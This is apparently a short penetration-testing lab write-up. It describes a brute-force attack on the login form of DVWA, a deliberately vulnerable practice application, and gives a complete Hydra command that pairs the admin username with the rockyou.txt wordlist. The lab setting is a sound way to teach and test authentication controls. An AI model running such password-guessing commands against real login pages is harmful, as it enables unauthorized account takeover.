## 📌 Scenario 1: DVWA Brute Force Attack

**Objective**  
Assess the effectiveness of authentication controls by simulating a brute-force attack against DVWA’s login form.

**Methodology**  
- Target application: Damn Vulnerable Web Application (DVWA)  
- Security level: *Low*  
- Attack type: HTTP POST brute force  

**Tools Used**  
- Hydra  
- Kali Linux wordlist (`rockyou.txt`)  

**Execution**  
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.30 \
http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^:Login failed"
